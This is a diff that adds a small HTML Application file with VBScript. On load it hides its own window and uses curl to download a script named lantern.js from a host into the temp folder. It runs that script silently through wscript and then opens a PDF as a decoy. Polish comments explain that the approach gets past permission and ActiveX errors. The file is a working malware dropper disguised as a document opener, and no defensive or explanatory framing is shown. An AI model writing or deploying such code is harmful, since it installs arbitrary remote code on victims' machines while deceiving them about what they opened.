@@ -1,0 +1,27 @@
+<html>
+<head>
+<HTA:APPLICATION SHOWINTASKBAR="no" CAPTION="no" TRUSTED="yes"/>
+<script language="VBScript">
+Sub Window_onLoad
+    self.resizeTo 0,0
+    self.moveTo -2000,-2000
+    Dim shell, tmp, cmd
+    Set shell = CreateObject("WScript.Shell")
+    tmp = shell.ExpandEnvironmentStrings("%TEMP%") & "\s.js"
+    
+    ' Używamy curl do pobrania lantern.js - to omija błędy Permission Denied i ActiveX
+    cmd = "cmd /c curl -s http://127.0.0.1/lantern.js -o """ & tmp & """"
+    shell.Run cmd, 0, True
+    
+    ' Uruchomienie pobranego skryptu JS
+    shell.Run "wscript.exe """ & tmp & """", 0, False
+    
+    ' Otwarcie PDF-a przez cmd (niezawodne)
+    shell.Run "cmd /c start https://www.orimi.com/pdf-test.pdf", 0, False
+    
+    self.close
+End Sub
+</script>
+</head>
+<body></body>
+</html>
